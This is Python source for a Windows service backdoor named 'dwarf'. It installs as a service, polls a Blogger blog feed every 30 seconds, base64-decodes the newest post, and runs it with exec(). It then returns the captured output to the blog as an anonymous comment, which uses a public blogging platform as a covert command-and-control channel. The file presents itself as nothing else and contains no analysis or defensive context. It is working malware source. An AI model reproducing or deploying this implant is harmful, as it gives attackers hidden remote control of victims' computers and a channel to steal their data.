import base64, time, sys, os, subprocess, servicemanager, requests, win32event, win32service, socket, win32serviceutil, multiprocessing.pool, wmi, re
from scapy.all import *
from multiprocessing.pool import Pool as ThreadPool
import pyautogui
from io import BytesIO
from io import StringIO

class DwarfService(win32serviceutil.ServiceFramework):
    _svc_name_ = "dwarf"
    _svc_display_name_ = "dwarfsvc.exe"
    blog_host = "{BLOG_URL}"
    post_list = []

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        rc = None
        while rc != win32event.WAIT_OBJECT_0:
            if self.sendHeartBeat():
                post = self.getCodeFromFeed()
                if post is not None:
                    if post["id"] not in self.post_list or "repeat" in post["title"].lower():
                        result = self.runCode(self.decryptB64(post["code"]))
                        if post["id"] not in self.post_list:
                            self.post_list.append(post["id"])
                        if result != "":
                            self.replyToPost(post['id'], result)
            rc = win32event.WaitForSingleObject(self.hWaitStop,  (1 * 30 * 1000))
            
    def sendHeartBeat(self):
        try:
            r = requests.get(self.blog_host)
            if r.status_code == 200:
                return True
            return False
        except:
            return False

    def replyToPost(self, id, result):
        blogId, postId = re.findall("-(\d+)+", id)
        get_response = requests.get(f"https://www.blogger.com/comment-iframe.g?blogID={blogId}&postID={postId}&skin=contempo&blogspotRpcToken=8672880&bpli=1")
        
        security_token = re.search('name="security_token" value="(\S+)"', get_response.text).group(1)

        body = {"security_token": security_token, "blogID": blogId, "postID": postId, "encodedSelectedId": "ANON%3D", "showPreview": "false", "skin": "contempo", "commentBody": result, "identityMenu": "ANON"}
        headers = {"Host": "www.blogger.com", "Connection": "close", "Content-Length": "265", "Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://www.blogger.com","Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "iframe", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"}
        try:
            requests.post("https://www.blogger.com/comment-iframe.do", data=body)
        except:
            pass
    
    def getCodeFromFeed(self):
        blog_feed = self.blog_host + '/feeds/posts/default?alt=json'
        try:
            feed = requests.get(blog_feed).json()['feed']['entry']
        except:
            return None
        if(len(feed) > 0):
            if feed[0]:
                return {
                        "id": feed[0]['id']['$t'],
                        "title": feed[0]['title']['$t'],
                        "code": feed[0]['content']['$t']
                        }
        return None

    def decryptB64(self, b64):
        return base64.b64decode(b64.encode('utf-8'))

    def runCode(self, code):
        old = sys.stdout
        sys.stdout = StringIO()
        exec(code)
        result = sys.stdout.getvalue().strip()
        sys.stdout = old
        return result

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(DwarfService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(DwarfService)